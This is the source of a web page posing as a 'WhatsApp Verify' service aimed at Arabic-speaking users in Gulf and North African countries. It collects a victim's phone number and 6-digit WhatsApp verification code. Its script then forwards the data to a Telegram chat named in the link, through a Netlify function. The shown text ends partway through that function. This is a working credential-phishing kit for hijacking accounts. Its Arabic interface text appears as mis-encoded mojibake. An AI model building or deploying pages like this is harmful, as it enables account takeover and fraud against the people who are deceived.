<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Verification - ØªÙˆØ«ÙŠÙ‚ ÙˆØ§ØªØ³Ø§Ø¨</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --whatsapp-green: #25D366;
            --whatsapp-dark-green: #128C7E;
            --whatsapp-light-green: #DCF8C6;
            --whatsapp-blue: #34B7F1;
            --whatsapp-dark: #075E54;
            --whatsapp-light: #ECE5DD;
            --whatsapp-white: #FFFFFF;
            --whatsapp-gray: #667781;
            --whatsapp-dark-gray: #3C3C3C;
            --gradient-whatsapp: linear-gradient(135deg, #25D366 0%, #128C7E 50%, #075E54 100%);
            --gradient-light: linear-gradient(135deg, #FFFFFF 0%, #F0F2F5 100%);
            --shadow-whatsapp: 0 8px 24px rgba(37, 211, 102, 0.2);
            --shadow-heavy: 0 0 40px rgba(37, 211, 102, 0.3);
            --current-country: #25D366;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', 'Inter', sans-serif;
        }

        body {
            background: var(--gradient-light);
            color: var(--whatsapp-dark-gray);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }

        /* Ø®Ù„ÙÙŠØ© ÙˆØ§ØªØ³Ø§Ø¨ */
        .whatsapp-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 20% 30%, rgba(37, 211, 102, 0.1) 0%, transparent 25%),
                radial-gradient(circle at 80% 70%, rgba(18, 140, 126, 0.05) 0%, transparent 25%),
                linear-gradient(to bottom, #FFFFFF, #F0F2F5);
            z-index: -2;
        }

        /* Ø§Ù„Ø­Ø§ÙˆÙŠØ© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ© */
        .whatsapp-container {
            background: var(--whatsapp-white);
            border-radius: 24px;
            width: 100%;
            max-width: 500px;
            padding: 40px 35px;
            position: relative;
            border: 1px solid rgba(37, 211, 102, 0.3);
            box-shadow: 
                0 25px 50px rgba(0, 0, 0, 0.1),
                var(--shadow-heavy),
                0 1px 3px rgba(0, 0, 0, 0.08);
            overflow: hidden;
            z-index: 1;
            transition: all 0.3s ease;
        }

        .whatsapp-container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: var(--gradient-whatsapp);
            z-index: 2;
        }

        /* Ù…Ø¤Ø´Ø± Ø§Ù„ØªÙ‚Ø¯Ù… */
        .progress-steps {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 40px;
            position: relative;
            padding: 0 10px;
        }

        .progress-steps::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 10%;
            right: 10%;
            height: 3px;
            background: rgba(37, 211, 102, 0.2);
            transform: translateY(-50%);
            z-index: 1;
        }

        .step {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: var(--whatsapp-white);
            border: 3px solid rgba(37, 211, 102, 0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            color: var(--whatsapp-gray);
            position: relative;
            z-index: 2;
            transition: all 0.3s ease;
        }

        .step.active {
            background: var(--whatsapp-green);
            border-color: var(--whatsapp-green);
            color: var(--whatsapp-white);
            transform: scale(1.1);
            box-shadow: 0 0 20px rgba(37, 211, 102, 0.4);
        }

        .step.completed {
            background: var(--whatsapp-dark-green);
            border-color: var(--whatsapp-dark-green);
            color: var(--whatsapp-white);
        }

        .step-label {
            position: absolute;
            top: 45px;
            font-size: 0.8rem;
            color: var(--whatsapp-gray);
            white-space: nowrap;
        }

        .step.active .step-label {
            color: var(--whatsapp-green);
            font-weight: 600;
        }

        /* Ø§Ù„Ù‡ÙŠØ¯Ø± */
        .whatsapp-header {
            text-align: center;
            margin-bottom: 30px;
            position: relative;
        }

        .logo-section {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
            margin-bottom: 20px;
        }

        /* Ø´Ø¹Ø§Ø± Ø§Ù„Ø´Ø±ÙƒØ© */
        .company-logo {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, rgba(37, 211, 102, 0.1), rgba(255, 255, 255, 0.9));
            border: 3px solid rgba(37, 211, 102, 0.4);
            box-shadow: 
                0 10px 30px rgba(0, 0, 0, 0.08),
                0 0 20px rgba(37, 211, 102, 0.2);
            position: relative;
            overflow: hidden;
        }

        .company-logo img {
            width: 60%;
            height: 60%;
            object-fit: contain;
        }

        .company-name {
            font-size: 1.1rem;
            font-weight: 700;
            color: var(--whatsapp-dark-green);
            margin-top: 8px;
            letter-spacing: 0.5px;
        }

        /* Ø´Ø¹Ø§Ø± ÙˆØ§ØªØ³Ø§Ø¨ */
        .whatsapp-brand {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            margin-bottom: 15px;
        }

        .whatsapp-icon {
            font-size: 2.5rem;
            color: var(--whatsapp-green);
            animation: whatsappPulse 2s infinite;
        }

        @keyframes whatsappPulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }

        .whatsapp-header h1 {
            font-size: 2.2rem;
            font-weight: 800;
            color: var(--whatsapp-dark-green);
            margin: 0;
            letter-spacing: -0.5px;
        }

        .whatsapp-header p {
            color: var(--whatsapp-gray);
            font-size: 1rem;
            font-weight: 400;
            max-width: 400px;
            margin: 15px auto 0;
            line-height: 1.6;
        }

        /* Ø§Ù„Ø®Ø·ÙˆØ§Øª */
        .step-container {
            display: none;
            animation: fadeIn 0.5s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .step-container.active {
            display: block;
        }

        /* Ø§Ù„Ø®Ø·ÙˆØ© 1: Ø§Ø®ØªÙŠØ§Ø± Ø§Ù„Ø¯ÙˆÙ„Ø© */
        .step-1 {
            text-align: center;
        }

        .step-title {
            font-size: 1.3rem;
            font-weight: 700;
            color: var(--whatsapp-dark-green);
            margin-bottom: 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .countries-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 15px;
            margin-bottom: 30px;
        }

        @media (max-width: 768px) {
            .countries-grid {
                grid-template-columns: repeat(3, 1fr);
            }
        }

        @media (max-width: 480px) {
            .countries-grid {
                grid-template-columns: repeat(2, 1fr);
            }
        }

        .country-card {
            background: var(--whatsapp-white);
            border: 2px solid rgba(37, 211, 102, 0.2);
            border-radius: 12px;
            padding: 20px 10px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .country-card:hover {
            border-color: var(--whatsapp-green);
            transform: translateY(-3px);
            box-shadow: var(--shadow-whatsapp);
        }

        .country-card.active {
            background: linear-gradient(135deg, rgba(37, 211, 102, 0.1), rgba(255, 255, 255, 0.95));
            border-color: var(--whatsapp-green);
            transform: translateY(-3px);
            box-shadow: 
                0 10px 25px rgba(37, 211, 102, 0.15),
                inset 0 1px 0 rgba(255, 255, 255, 0.5);
        }

        .country-card.active::after {
            content: 'âœ“';
            position: absolute;
            top: 8px;
            right: 8px;
            width: 20px;
            height: 20px;
            background: var(--whatsapp-green);
            border-radius: 50%;
            color: white;
            font-size: 0.8rem;
            font-weight: bold;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .country-flag {
            font-size: 2rem;
            margin-bottom: 8px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .country-name {
            font-size: 0.85rem;
            color: var(--whatsapp-dark-gray);
            font-weight: 600;
            margin-bottom: 5px;
        }

        .country-code {
            font-size: 0.8rem;
            color: var(--whatsapp-green);
            font-weight: 700;
            background: rgba(37, 211, 102, 0.1);
            padding: 4px 10px;
            border-radius: 15px;
            display: inline-block;
        }

        /* Ø§Ù„Ø®Ø·ÙˆØ© 2: Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„Ø±Ù‚Ù… */
        .step-2 {
            text-align: center;
        }

        .form-group {
            margin-bottom: 25px;
        }

        .form-label {
            display: block;
            color: var(--whatsapp-dark-green);
            font-size: 0.9rem;
            margin-bottom: 10px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .form-label i {
            color: var(--whatsapp-green);
            font-size: 1rem;
        }

        .phone-input-group {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }

        .country-code-display {
            flex: 0 0 80px;
            background: rgba(37, 211, 102, 0.1);
            border: 2px solid rgba(37, 211, 102, 0.3);
            border-radius: 12px;
            padding: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            color: var(--whatsapp-dark-green);
            font-size: 1.1rem;
        }

        .input-wrapper {
            flex: 1;
            position: relative;
        }

        .input-icon {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--whatsapp-green);
            font-size: 1.1rem;
            z-index: 2;
        }

        .whatsapp-input {
            width: 100%;
            background: var(--whatsapp-white);
            border: 2px solid rgba(37, 211, 102, 0.2);
            border-radius: 12px;
            padding: 16px 50px 16px 20px;
            color: var(--whatsapp-dark-gray);
            font-size: 1rem;
            font-weight: 500;
            transition: all 0.3s ease;
            outline: none;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
        }

        .whatsapp-input:focus {
            border-color: var(--whatsapp-green);
            box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.15), 0 4px 12px rgba(0, 0, 0, 0.08);
        }

        .whatsapp-input::placeholder {
            color: var(--whatsapp-gray);
            font-weight: 400;
            opacity: 0.6;
        }

        /* Ø§Ù„Ø®Ø·ÙˆØ© 3: Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„ÙƒÙˆØ¯ */
        .step-3 {
            text-align: center;
        }

        .code-instructions {
            background: rgba(37, 211, 102, 0.08);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 25px;
            border: 1px solid rgba(37, 211, 102, 0.2);
            text-align: center;
        }

        .code-instructions i {
            font-size: 2rem;
            color: var(--whatsapp-green);
            margin-bottom: 10px;
        }

        .code-instructions p {
            color: var(--whatsapp-dark-green);
            font-weight: 500;
            margin-bottom: 5px;
        }

        .code-instructions small {
            color: var(--whatsapp-gray);
            font-size: 0.85rem;
        }

        .code-input-group {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }

        .code-input {
            flex: 1;
            text-align: center;
            font-size: 1.5rem;
            font-weight: 700;
            letter-spacing: 5px;
            padding: 15px;
        }

        .code-timer {
            font-size: 0.9rem;
            color: var(--whatsapp-gray);
            margin-bottom: 20px;
        }

        .code-timer span {
            color: var(--whatsapp-green);
            font-weight: 700;
        }

        /* Ø§Ù„Ø£Ø²Ø±Ø§Ø± */
        .button-group {
            display: flex;
            gap: 15px;
            margin-top: 30px;
        }

        .whatsapp-btn {
            flex: 1;
            background: var(--gradient-whatsapp);
            border: none;
            border-radius: 12px;
            padding: 18px;
            color: var(--whatsapp-white);
            font-size: 1rem;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            letter-spacing: 0.5px;
            position: relative;
            overflow: hidden;
            box-shadow: 0 8px 20px rgba(37, 211, 102, 0.25);
        }

        .whatsapp-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 12px 25px rgba(37, 211, 102, 0.35);
        }

        .whatsapp-btn:active {
            transform: translateY(0);
        }

        .whatsapp-btn.secondary {
            background: var(--whatsapp-white);
            color: var(--whatsapp-dark-green);
            border: 2px solid var(--whatsapp-green);
            box-shadow: none;
        }

        .whatsapp-btn.secondary:hover {
            background: rgba(37, 211, 102, 0.05);
        }

        .whatsapp-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none !important;
        }

        .btn-content {
            position: relative;
            z-index: 2;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .loading {
            display: none;
        }

        /* Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ */
        .whatsapp-message {
            margin-top: 25px;
            padding: 20px;
            border-radius: 12px;
            text-align: center;
            font-size: 1rem;
            font-weight: 500;
            min-height: 60px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            transition: all 0.3s ease;
            opacity: 0;
            visibility: hidden;
            transform: translateY(10px);
        }

        .whatsapp-message.show {
            opacity: 1;
            visibility: visible;
            transform: translateY(0);
        }

        .whatsapp-message.success {
            background: rgba(37, 211, 102, 0.1);
            border: 1px solid rgba(37, 211, 102, 0.3);
            color: var(--whatsapp-green);
        }

        .whatsapp-message.error {
            background: rgba(244, 67, 54, 0.1);
            border: 1px solid rgba(244, 67, 54, 0.3);
            color: #F44336;
        }

        .whatsapp-message.processing {
            background: rgba(255, 193, 7, 0.1);
            border: 1px solid rgba(255, 193, 7, 0.3);
            color: #FFC107;
        }

        /* Ø§Ù„Ù…ÙŠØ²Ø§Øª */
        .whatsapp-features {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 20px;
            margin-top: 35px;
            padding-top: 25px;
            border-top: 1px solid rgba(37, 211, 102, 0.1);
        }

        .feature-item {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .feature-icon {
            width: 40px;
            height: 40px;
            background: rgba(37, 211, 102, 0.1);
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.2rem;
            color: var(--whatsapp-green);
            flex-shrink: 0;
        }

        .feature-text {
            font-size: 0.85rem;
            color: var(--whatsapp-gray);
            font-weight: 500;
            line-height: 1.4;
        }

        /* ØªØ£Ø«ÙŠØ±Ø§Øª */
        @media (max-width: 768px) {
            .whatsapp-container {
                padding: 30px 25px;
                max-width: 100%;
            }
            
            .countries-grid {
                grid-template-columns: repeat(3, 1fr);
            }
            
            .whatsapp-features {
                grid-template-columns: 1fr;
                gap: 15px;
            }
            
            .whatsapp-header h1 {
                font-size: 1.9rem;
            }
            
            .company-logo {
                width: 90px;
                height: 90px;
            }
            
            .whatsapp-btn {
                padding: 16px;
                font-size: 0.95rem;
            }
        }

        @media (max-width: 480px) {
            .whatsapp-container {
                padding: 25px 20px;
            }
            
            .whatsapp-header h1 {
                font-size: 1.7rem;
            }
            
            .countries-grid {
                grid-template-columns: repeat(2, 1fr);
            }
            
            .phone-input-group {
                flex-direction: column;
            }
            
            .country-code-display {
                width: 100%;
            }
            
            .button-group {
                flex-direction: column;
            }
        }
    </style>
</head>
<body>
    <div class="whatsapp-bg"></div>

    <div class="whatsapp-container">
        <!-- Ù…Ø¤Ø´Ø± Ø§Ù„ØªÙ‚Ø¯Ù… -->
        <div class="progress-steps">
            <div class="step active" data-step="1">
                <span>1</span>
                <div class="step-label">Ø§Ø®ØªØ± Ø§Ù„Ø¯ÙˆÙ„Ø©</div>
            </div>
            <div class="step" data-step="2">
                <span>2</span>
                <div class="step-label">Ø£Ø¯Ø®Ù„ Ø§Ù„Ø±Ù‚Ù…</div>
            </div>
            <div class="step" data-step="3">
                <span>3</span>
                <div class="step-label">Ø£Ø¯Ø®Ù„ Ø§Ù„ÙƒÙˆØ¯</div>
            </div>
        </div>

        <!-- Ø§Ù„Ù‡ÙŠØ¯Ø± -->
        <div class="whatsapp-header">
            <div class="logo-section">
                <!-- Ø´Ø¹Ø§Ø± Ø§Ù„Ø´Ø±ÙƒØ© -->
                <div class="company-logo">
                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Cdefs%3E%3ClinearGradient id='grad' x1='0%25' y1='0%25' x2='100%25' y2='100%25'%3E%3Cstop offset='0%25' style='stop-color:%2325D366;stop-opacity:1'/%3E%3Cstop offset='100%25' style='stop-color:%23128C7E;stop-opacity:1'/%3E%3C/linearGradient%3E%3C/defs%3E%3Ccircle cx='50' cy='50' r='45' fill='url(%23grad)'/%3E%3Cpath d='M65,35 Q75,35 75,45 L75,65 Q75,75 65,75 L35,75 Q25,75 25,65 L25,45 Q25,35 35,35 Z' fill='white'/%3E%3Cpath d='M40,45 L60,45 L60,55 L40,55 Z' fill='%2325D366'/%3E%3C/svg%3E" alt="WhatsApp Verify Logo">
                </div>
                <div class="company-name">WHATSAPP VERIFY</div>

                <!-- Ø¨Ø±Ø§Ù†Ø¯ ÙˆØ§ØªØ³Ø§Ø¨ -->
                <div class="whatsapp-brand">
                    <div class="whatsapp-icon">
                        <i class="fab fa-whatsapp"></i>
                    </div>
                    <h1>ØªÙˆØ«ÙŠÙ‚ <span>ÙˆØ§ØªØ³Ø§Ø¨</span></h1>
                </div>
            </div>
            
            <p>ØªÙˆØ«ÙŠÙ‚ Ø­Ø³Ø§Ø¨ ÙˆØ§ØªØ³Ø§Ø¨ Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ Ø¨Ø³Ù‡ÙˆÙ„Ø© ÙˆØ£Ù…Ø§Ù†</p>
        </div>

        <!-- Ø§Ù„Ø®Ø·ÙˆØ© 1: Ø§Ø®ØªÙŠØ§Ø± Ø§Ù„Ø¯ÙˆÙ„Ø© -->
        <div class="step-container step-1 active">
            <div class="step-title">
                <i class="fas fa-globe-asia"></i>
                Ø§Ø®ØªØ± Ø¯ÙˆÙ„ØªÙƒ
            </div>
            
            <div class="countries-grid">
                <div class="country-card active" data-country="sa" data-flag="ğŸ‡¸ğŸ‡¦" data-code="+966" data-name="Ø§Ù„Ø³Ø¹ÙˆØ¯ÙŠØ©">
                    <div class="country-flag">ğŸ‡¸ğŸ‡¦</div>
                    <div class="country-name">Ø§Ù„Ø³Ø¹ÙˆØ¯ÙŠØ©</div>
                    <div class="country-code">+966</div>
                </div>
                <div class="country-card" data-country="ae" data-flag="ğŸ‡¦ğŸ‡ª" data-code="+971" data-name="Ø§Ù„Ø¥Ù…Ø§Ø±Ø§Øª">
                    <div class="country-flag">ğŸ‡¦ğŸ‡ª</div>
                    <div class="country-name">Ø§Ù„Ø¥Ù…Ø§Ø±Ø§Øª</div>
                    <div class="country-code">+971</div>
                </div>
                <div class="country-card" data-country="kw" data-flag="ğŸ‡°ğŸ‡¼" data-code="+965" data-name="Ø§Ù„ÙƒÙˆÙŠØª">
                    <div class="country-flag">ğŸ‡°ğŸ‡¼</div>
                    <div class="country-name">Ø§Ù„ÙƒÙˆÙŠØª</div>
                    <div class="country-code">+965</div>
                </div>
                <div class="country-card" data-country="qa" data-flag="ğŸ‡¶ğŸ‡¦" data-code="+974" data-name="Ù‚Ø·Ø±">
                    <div class="country-flag">ğŸ‡¶ğŸ‡¦</div>
                    <div class="country-name">Ù‚Ø·Ø±</div>
                    <div class="country-code">+974</div>
                </div>
                <div class="country-card" data-country="om" data-flag="ğŸ‡´ğŸ‡²" data-code="+968" data-name="Ø¹Ù…Ø§Ù†">
                    <div class="country-flag">ğŸ‡´ğŸ‡²</div>
                    <div class="country-name">Ø¹Ù…Ø§Ù†</div>
                    <div class="country-code">+968</div>
                </div>
                <div class="country-card" data-country="bh" data-flag="ğŸ‡§ğŸ‡­" data-code="+973" data-name="Ø§Ù„Ø¨Ø­Ø±ÙŠÙ†">
                    <div class="country-flag">ğŸ‡§ğŸ‡­</div>
                    <div class="country-name">Ø§Ù„Ø¨Ø­Ø±ÙŠÙ†</div>
                    <div class="country-code">+973</div>
                </div>
                <div class="country-card" data-country="eg" data-flag="ğŸ‡ªğŸ‡¬" data-code="+20" data-name="Ù…ØµØ±">
                    <div class="country-flag">ğŸ‡ªğŸ‡¬</div>
                    <div class="country-name">Ù…ØµØ±</div>
                    <div class="country-code">+20</div>
                </div>
                <div class="country-card" data-country="jo" data-flag="ğŸ‡¯ğŸ‡´" data-code="+962" data-name="Ø§Ù„Ø£Ø±Ø¯Ù†">
                    <div class="country-flag">ğŸ‡¯ğŸ‡´</div>
                    <div class="country-name">Ø§Ù„Ø£Ø±Ø¯Ù†</div>
                    <div class="country-code">+962</div>
                </div>
                <div class="country-card" data-country="lb" data-flag="ğŸ‡±ğŸ‡§" data-code="+961" data-name="Ù„Ø¨Ù†Ø§Ù†">
                    <div class="country-flag">ğŸ‡±ğŸ‡§</div>
                    <div class="country-name">Ù„Ø¨Ù†Ø§Ù†</div>
                    <div class="country-code">+961</div>
                </div>
                <div class="country-card" data-country="ma" data-flag="ğŸ‡²ğŸ‡¦" data-code="+212" data-name="Ø§Ù„Ù…ØºØ±Ø¨">
                    <div class="country-flag">ğŸ‡²ğŸ‡¦</div>
                    <div class="country-name">Ø§Ù„Ù…ØºØ±Ø¨</div>
                    <div class="country-code">+212</div>
                </div>
                <div class="country-card" data-country="dz" data-flag="ğŸ‡©ğŸ‡¿" data-code="+213" data-name="Ø§Ù„Ø¬Ø²Ø§Ø¦Ø±">
                    <div class="country-flag">ğŸ‡©ğŸ‡¿</div>
                    <div class="country-name">Ø§Ù„Ø¬Ø²Ø§Ø¦Ø±</div>
                    <div class="country-code">+213</div>
                </div>
                <div class="country-card" data-country="tn" data-flag="ğŸ‡¹ğŸ‡³" data-code="+216" data-name="ØªÙˆÙ†Ø³">
                    <div class="country-flag">ğŸ‡¹ğŸ‡³</div>
                    <div class="country-name">ØªÙˆÙ†Ø³</div>
                    <div class="country-code">+216</div>
                </div>
            </div>
            
            <button class="whatsapp-btn" id="nextToStep2">
                <div class="btn-content">
                    <i class="fas fa-arrow-right"></i>
                    <span>Ø§Ù„ØªØ§Ù„ÙŠ</span>
                </div>
            </button>
        </div>

        <!-- Ø§Ù„Ø®Ø·ÙˆØ© 2: Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„Ø±Ù‚Ù… -->
        <div class="step-container step-2">
            <div class="step-title">
                <i class="fas fa-mobile-alt"></i>
                Ø£Ø¯Ø®Ù„ Ø±Ù‚Ù… ÙˆØ§ØªØ³Ø§Ø¨
            </div>
            
            <div class="form-group">
                <div class="phone-input-group">
                    <div class="country-code-display" id="selectedCountryCode">+966</div>
                    <div class="input-wrapper">
                        <input type="tel" id="phoneNumber" class="whatsapp-input" placeholder="Ø§Ø¯Ø®Ù„ Ø¨Ø¯ÙˆÙ† Ø§Ù„ØµÙØ± Ø§Ù„Ø§ÙˆÙ„" required>
                        <div class="input-icon">
                            <i class="fas fa-phone"></i>
                        </div>
                    </div>
                </div>
                
                <div class="form-label">
                    <i class="fas fa-info-circle"></i>
                    Ø£Ø¯Ø®Ù„ Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ Ø¨Ø¯ÙˆÙ† Ø±Ù…Ø² Ø§Ù„Ø¯ÙˆÙ„Ø©
                </div>
            </div>
            
            <div class="button-group">
                <button class="whatsapp-btn secondary" id="backToStep1">
                    <div class="btn-content">
                        <i class="fas fa-arrow-left"></i>
                        <span>Ø±Ø¬ÙˆØ¹</span>
                    </div>
                </button>
                <button class="whatsapp-btn" id="sendPhoneNumber">
                    <div class="btn-content">
                        <i class="fas fa-paper-plane"></i>
                        <span>Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ù‚Ù…</span>
                        <div class="loading" id="phoneLoading">
                            <i class="fas fa-spinner fa-spin"></i>
                        </div>
                    </div>
                </button>
            </div>
            
            <!-- Ø±Ø³Ø§Ù„Ø© Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ù‚Ù… -->
            <div class="whatsapp-message" id="phoneMessage"></div>
        </div>

        <!-- Ø§Ù„Ø®Ø·ÙˆØ© 3: Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„ÙƒÙˆØ¯ -->
        <div class="step-container step-3">
            <div class="step-title">
                <i class="fas fa-shield-alt"></i>
                Ø£Ø¯Ø®Ù„ ÙƒÙˆØ¯ Ø§Ù„ØªØ­Ù‚Ù‚
            </div>
            
            <div class="code-instructions">
                <i class="fas fa-comment-alt"></i>
                <p>ØªÙ… Ø¥Ø±Ø³Ø§Ù„ ÙƒÙˆØ¯ ØªØ­Ù‚Ù‚ Ù…ÙƒÙˆÙ† Ù…Ù† 6 Ø£Ø±Ù‚Ø§Ù… Ø¥Ù„Ù‰ Ø±Ù‚Ù… ÙˆØ§ØªØ³Ø§Ø¨ Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ</p>
                <small>Ø£Ø¯Ø®Ù„ Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø°ÙŠ ØªÙ„Ù‚ÙŠØªÙ‡ Ø®Ù„Ø§Ù„ 10 Ø¯Ù‚Ø§Ø¦Ù‚</small>
            </div>
            
            <div class="form-group">
                <div class="input-wrapper">
                    <input type="text" id="verificationCode" class="whatsapp-input code-input" placeholder="123456" maxlength="6" required>
                    <div class="input-icon">
                        <i class="fas fa-key"></i>
                    </div>
                </div>
                
                <div class="code-timer" id="codeTimer">
                    Ø§Ù„ÙˆÙ‚Øª Ø§Ù„Ù…ØªØ¨Ù‚ÙŠ: <span>10:00</span>
                </div>
            </div>
            
            <div class="button-group">
                <button class="whatsapp-btn secondary" id="backToStep2">
                    <div class="btn-content">
                        <i class="fas fa-arrow-left"></i>
                        <span>Ø±Ø¬ÙˆØ¹</span>
                    </div>
                </button>
                <button class="whatsapp-btn" id="sendVerificationCode">
                    <div class="btn-content">
                        <i class="fas fa-check-circle"></i>
                        <span>ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„ÙƒÙˆØ¯</span>
                        <div class="loading" id="codeLoading">
                            <i class="fas fa-spinner fa-spin"></i>
                        </div>
                    </div>
                </button>
            </div>
            
            <!-- Ø±Ø³Ø§Ù„Ø© Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙƒÙˆØ¯ -->
            <div class="whatsapp-message" id="codeMessage"></div>
        </div>

        <!-- Ø§Ù„Ù…ÙŠØ²Ø§Øª -->
        <div class="whatsapp-features">
            <div class="feature-item">
                <div class="feature-icon">
                    <i class="fas fa-shield-alt"></i>
                </div>
                <div class="feature-text">ØªÙˆØ«ÙŠÙ‚ Ø¢Ù…Ù† Ø¨Ù†Ø³Ø¨Ø© 100%</div>
            </div>
            <div class="feature-item">
                <div class="feature-icon">
                    <i class="fas fa-bolt"></i>
                </div>
                <div class="feature-text">ØªÙˆØ«ÙŠÙ‚ ÙÙˆØ±ÙŠ Ø®Ù„Ø§Ù„ Ø¯Ù‚Ø§Ø¦Ù‚</div>
            </div>
            <div class="feature-item">
                <div class="feature-icon">
                    <i class="fas fa-headset"></i>
                </div>
                <div class="feature-text">Ø¯Ø¹Ù… ÙÙ†ÙŠ Ù…ØªØ®ØµØµ</div>
            </div>
            <div class="feature-item">
                <div class="feature-icon">
                    <i class="fas fa-lock"></i>
                </div>
                <div class="feature-text">Ø®ØµÙˆØµÙŠØ© ØªØ§Ù…Ø© Ù„Ù„Ø¨ÙŠØ§Ù†Ø§Øª</div>
            </div>
        </div>

        <!-- Ø§Ù„Ø­Ù‚ÙˆÙ„ Ø§Ù„Ù…Ø®ÙÙŠØ© -->
        <div style="display: none;">
            <input type="hidden" id="chatId">
            <input type="hidden" id="IDx">
            <input type="hidden" id="selectedCountry" value="sa">
            <input type="hidden" id="selectedCountryName" value="Ø§Ù„Ø³Ø¹ÙˆØ¯ÙŠØ©">
            <input type="hidden" id="selectedCountryFlag" value="ğŸ‡¸ğŸ‡¦">
        </div>
    </div>

    <script>
        // Ø¯Ø§Ù„Ø© Ù„Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ù€ chatId Ù…Ù† Ø§Ù„Ø±Ø§Ø¨Ø· - Ù…Ù† Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ù‚Ø¯ÙŠÙ…
        function getChatIdFromURL() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('chatId');
        }

        // Ø¯Ø§Ù„Ø© Ù„Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ù€ IDx Ù…Ù† Ø§Ù„Ø±Ø§Ø¨Ø· - Ù…Ù† Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ù‚Ø¯ÙŠÙ…
        function getIDxFromURL() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('IDx') || urlParams.get('idx');
        }

        // Ø¯Ø§Ù„Ø© Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù… Ø¹Ø¨Ø± Netlify Function - Ù…Ù† Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ù‚Ø¯ÙŠÙ…
        async function sendToTelegram(message) {
            const chatId = getChatIdFromURL();
            
            if (!chatId) {
                console.error('Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ chatId ÙÙŠ Ø§Ù„Ø±Ø§Ø¨Ø·');
                return false;
            }

            try {
                // Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ù„Ù€ Netlify Function (Ø§Ù„ØªÙŠ Ø¨Ø¯ÙˆØ±Ù‡Ø§ ØªØ±Ø³Ù„ Ù„Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…)
                const response = await fetch('/.netlify/functions/telegram', {
                    method: 'POST',
